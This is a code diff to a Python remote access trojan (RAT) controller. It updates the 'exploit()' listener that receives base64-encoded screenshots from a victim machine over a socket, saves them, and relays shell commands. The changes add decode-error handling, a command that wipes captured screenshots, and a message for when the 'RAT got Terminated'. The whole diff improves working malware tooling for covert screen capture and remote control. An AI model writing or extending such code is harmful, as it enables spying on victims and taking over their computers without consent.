@@ -1,10 +1,12 @@
 #!/usr/bin/python
 #################imps
 import base64
+import binascii
 import os
 import random
 import socket
 import datetime
+import shutil
 from colorama import *
 from PIL import Image
 from term_image.image import from_file
@@ -102,7 +104,7 @@ def exploit():
         iscorrect = False
         index = 0
 
-        img = ""
+        img = str("")
         shout = ""
         sh = False
         capt = False
@@ -142,18 +144,23 @@ def exploit():
                         print(dat)
                 
                 if capt:
+                    img = str(img)
                     img += dat
                     if data.decode().endswith(payl):
-                        datet = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
-                        imgdata = base64.b64decode(img)
-                        filename = datet + "_" + str(random.randint(111111, 999999)) + ".png"
-                        with open("pics/"+filename, 'wb') as f:
-                            f.write(imgdata)
-                        imgdata = ""
-                        img = ""
-                        capt = False
-                        print(f"{Fore.GREEN}[+]{Fore.WHITE} Image saved as '{Fore.BLUE}{filename}{Fore.WHITE}'")
-                        usinput = "recon"
+                        try:
+                            datet = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
+                            imgdata = base64.b64decode(img)
+                            filename = datet + "_" + str(random.randint(111111, 999999)) + ".png"
+                            with open("pics/"+filename, 'wb') as f:
+                                f.write(imgdata)
+                            imgdata = ""
+                            img = ""
+                            capt = False
+                            print(f"{Fore.GREEN}[+]{Fore.WHITE} Image saved as '{Fore.BLUE}{filename}{Fore.WHITE}'")
+                            usinput = "recon"
+                        except binascii.Error:
+                            usinput = "recon"
+                            print(f"{Fore.RED}[-]{Fore.WHITE} Couldn't decode Image")
                         # usinput = input(f"{Fore.BLUE}[{shout}][shell]{Fore.WHITE}"+prompt())
                 
 
@@ -181,7 +188,12 @@ def exploit():
                     files = os.listdir("pics")
                     for file in files:
                         if file.strip().endswith(".png"):
-                            print(f"{Fore.MAGENTA}{file}{Fore.WHITE}")
+                            print(f"{Fore.MAGENTA}pics/{file}{Fore.WHITE}")
+                elif usinput == "cshots":
+                    dontsend = True
+
+                    shutil.rmtree("pics/")
+                    os.mkdir("pics")
                 elif usinput.strip() == "":
                     dontsend = True
                 elif usinput.strip() == "clear":
@@ -208,6 +220,9 @@ def exploit():
                 data = ""
                 index += 1
         except KeyboardInterrupt:
+            pass
+        except BrokenPipeError:
+            print(f"{Fore.RED}[-]{Fore.WHITE} RAT got Terminated!!!")
             pass
         conn.close()
 
